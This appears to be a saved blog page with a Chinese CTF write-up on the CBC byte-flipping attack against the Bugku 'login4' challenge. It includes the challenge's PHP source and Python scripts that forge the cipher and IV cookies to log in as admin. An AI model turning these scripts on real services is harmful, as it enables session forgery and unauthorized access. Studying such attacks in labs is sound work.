@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>CBC字节翻转攻击 | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="Bugkuctf-Web">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CBC字节翻转攻击">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/47995/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="Bugkuctf-Web">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/9.png">
+<meta property="og:updated_time" content="2018-08-11T05:43:28.692Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CBC字节翻转攻击">
+<meta name="twitter:description" content="Bugkuctf-Web">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/CBC字节翻转攻击/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">CBC字节翻转攻击</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CBC原理"><span class="post-toc-number">1.</span> <span class="post-toc-text">CBC原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#实例"><span class="post-toc-number">2.</span> <span class="post-toc-text">实例</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-CBC字节翻转攻击"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">CBC字节翻转攻击</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-08-11 11:12:00" datetime="2018-08-11T03:12:00.000Z"  itemprop="datePublished">2018-08-11</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Bugkuctf-Web/">Bugkuctf-Web</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">10</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了<a id="more"></a></p>
+<h3 id="CBC原理"><a href="#CBC原理" class="headerlink" title="CBC原理"></a>CBC原理</h3><p>首先还是要稍微了解一下CBC加密和解密的原理</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/CBC字节翻转攻击/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>如果用公式来表示的话，如下：（C表示密文，E表示进行加密，P表示明文，D表示进行解密，IV表示初始向量） </p>
+<p><img src="/img/CBC字节翻转攻击/2.png" alt=""></p>
+<p>再来看看如何进行攻击：（下面图片摘自《图解密码技术》一书） </p>
+<p><img src="/img/CBC字节翻转攻击/3.png" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/CBC字节翻转攻击/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>上面就是CBC原理，其实看上去一脸懵逼很正常，但是其实我们只需要关注CBC解密的过程，因为我们攻击的过程就是解密的过程，为什么呢，我们来看实例的代码分析就知道了</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>实例来自bugkuctf web类最后一题login4</p>
+<p>网址：<a href="http://118.89.219.210:49168/" target="_blank" rel="noopener">http://118.89.219.210:49168/</a></p>
+<p>扫描目录发现存在文件.index.php.swp，下载下来后用linux 的vim -r 命令恢复文件后可以查看到源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先服务器接收我们POST的参数username和password，并对username进行检查，如果是admin，则退出程序，如果不是admin，则创建一个数组info，来存放我们输入的username和password，然后经过login函数，也就是cbc的加密，加密的过程是首先创建一个16位长度的随机字符串，然后与数组info序列化后的字符串plain进行CBC加密，也就是一系列的异或运算，具体的加密我们可以不用管，因为我们改变不了加密的过程，我们要操作的，是接下来的解密过程。再往下看程序，加密完以后，会将加密过程的初始化向量(也就是16位的随机字符串)iv和加密后的密文cipher经过base64加密后分别存放到cookie中，这样加密过程就算完成了。接下来，我们再次登录时，服务器执行check_login函数，将cookie中的iv和cipher字段值取出来进行base64解密后，进行cbc的解密，再将解密后字符串进行反序列化得到数组info，然后将info的username取出放入session的username字段，最后检查username如果是admin，则可以查看到flag，如果不是，则输出只有admin才可以查看flag，总的来说，这算是前后矛盾，一开始如果我们输入的username是admin，则提示admin查看不了flag，我们输入的如果不是admin，又提示admin才可以查看flag</p>
+<p>所以，要拿到flag，我们的思路，就是一开始输入Admin，然后操作CBC解密的过程，让它最后解密出来的值变成admin，就可以拿到flag，为此，我们重点就是放在cbc解密的过程，来看一张比较清楚的思路图</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/CBC字节翻转攻击/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>分析解密的过程：</p>
+<p>(1)首先以16位为长度对密文进行分组</p>
+<p>(2)初始化向量iv与前16位的解密的密文分组1进行位异或运算得到明文分组1</p>
+<p>(3)密文分组1与解密的密文分组2进行异或运算得到明文分组2</p>
+<p>(4)密文分组2与解密的密文分组3进行异或运算得到明文分组3</p>
+<p>(5)以此类推</p>
+<p>那我们就按照解密的过程的顺序逐步演示攻击的过程</p>
+<p>首先我们对明文进行分组，因为我们加密的过程也是位异或，所以最终得到的密文位数是等于明文位数的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;<span class="string">'Admin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'admin'</span>);</span><br><span class="line">$plain = serialize($info);</span><br><span class="line"><span class="keyword">echo</span> $plain.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($plain); $i++)&#123;</span><br><span class="line">	<span class="keyword">if</span>($plain[$i] == <span class="string">'A'</span>)&#123;</span><br><span class="line">		$A_index = $i % <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($i % <span class="number">16</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.$plain[$i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> $plain[$i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;'</span>.<span class="string">'the index of A is: '</span>.$A_index;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里我们定下一开始输入的username是Admin,password是admin,对info数组进行序列化处理然后分组</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/CBC字节翻转攻击/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们翻转的位置是A，我们要想办法将它翻转成a，从而将用户名变成admin，上面已经分析过了解密是位异或，A所处于的密文分组是分组2，它是与密文分组1进行位异或运算得到明文分组2的</p>
+<p>所以我们要操纵的就是密文分组1的第9位，使它与A所处的密文分组2异或后得到a</p>
+<p>但是我们还要考虑，我们改变了密文分组的第9位，只会影响下一组明文翻转的那一位，但却会影响本组明文的全部，因为我们翻转过的密文要先经过解密，然后才和IV变量进行异或，解密的时候是整串数据进行，所以整串明文受其影响。甚至可能会导致生成的明文部分乱码，至少绝对不再是原来的明文了。 所以，我们还需要操作iv，也就是初始化向量，使它与解密的密文分组1异或能得到原来的明文分组1，也就是a:2:{s:8:”userna</p>
+<p>最后就需要考虑如何得到我们想要的字符，直接看公式吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本组明文 = Decrypt(本组密文) ^ 上一组密文</span><br><span class="line">A              B                 C</span><br><span class="line">=========================================================</span><br><span class="line">A = B ^ C</span><br><span class="line">A ^ A = 0;   0 ^ A = A</span><br><span class="line">C = A ^ A ^ C = B ^ C ^ A ^ C = A ^ B</span><br><span class="line">(即C = A ^ B ，即：上一组密文 = 本组明文 ^ Decrypt(本组密文) )</span><br><span class="line">ascii(&apos;a&apos;) ^ C ^ A ^ B = ascii(&apos;a&apos;) ^ A ^ B ^ A ^ B = ascii(&apos;a&apos;) ^ 0 = ascii(&apos;a&apos;)</span><br><span class="line">(假设我们想要翻转成a，使用如上公式即可,即：想要的字符 = 上一组密文 ^ 本组明文 ^ Decrypt(本组密文) ^ 想要的字符 )</span><br></pre></td></tr></table></figure>
+<p>那么接下来，我们就可以开始编写脚本了，首先，我们先将用户名：Admin和密码：admin POST给服务器</p>
+<p>然后获取cookie值的cipher字段，操作第一个密文分组的第九位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49168/"</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'username'</span>:<span class="string">'Admin'</span>,</span><br><span class="line">	<span class="string">'password'</span>:<span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">cipher = cookies[<span class="string">'cipher'</span>]</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">index = <span class="number">9</span></span><br><span class="line">new_cipher = cipher[:index] + chr(ord(cipher[index])^ord(<span class="string">'A'</span>)^ord(<span class="string">'a'</span>)) + cipher[index+<span class="number">1</span>:]</span><br><span class="line">new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">cookies[<span class="string">'cipher'</span>] = new_cipher</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r2.text</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/CBC字节翻转攻击/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到修改cipher后，再次访问页面给出了提示解密后的明文的不能被序列化，就是因为我们操纵密文分组1，改变了全部的明文分组1，使之不能被序列化</p>
+<p>我们将plain取出，解码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plain = base64.b64decode(re.findall(<span class="string">"base64_decode\('(.*)'\)"</span>,r2.text)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/CBC字节翻转攻击/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到，我们已经成功的将A翻转成a，但是导致了本组明文乱码</p>
+<p>所以接下来我们要操作的是iv的全部十六位，下面给出所有代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49168/"</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'username'</span>:<span class="string">'Admin'</span>,</span><br><span class="line">	<span class="string">'password'</span>:<span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">cipher = cookies[<span class="string">'cipher'</span>]</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">index = <span class="number">9</span></span><br><span class="line">new_cipher = cipher[:index] + chr(ord(cipher[index])^ord(<span class="string">'A'</span>)^ord(<span class="string">'a'</span>)) + cipher[index+<span class="number">1</span>:]</span><br><span class="line">new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">cookies[<span class="string">'cipher'</span>] = new_cipher</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url,cookies=cookies)</span><br><span class="line">plain = base64.b64decode(re.findall(<span class="string">"base64_decode\('(.*)'\)"</span>,r2.text)[<span class="number">0</span>])</span><br><span class="line">iv = cookies[<span class="string">'iv'</span>]</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">target = <span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	new_iv = new_iv + chr(ord(target[i])^ord(plain[i])^ord(iv[i]))</span><br><span class="line">cookies[<span class="string">'iv'</span>] = urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line"></span><br><span class="line">r3 = requests.get(url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r3.text</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/CBC字节翻转攻击/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功获得flag</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-08-11T05:43:28.692Z" itemprop="dateUpdated">2018-08-11 13:43:28</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/47995/" target="_blank" rel="external">https://Foxgrin.github.io/posts/47995/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/47995/&title=《CBC字节翻转攻击》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
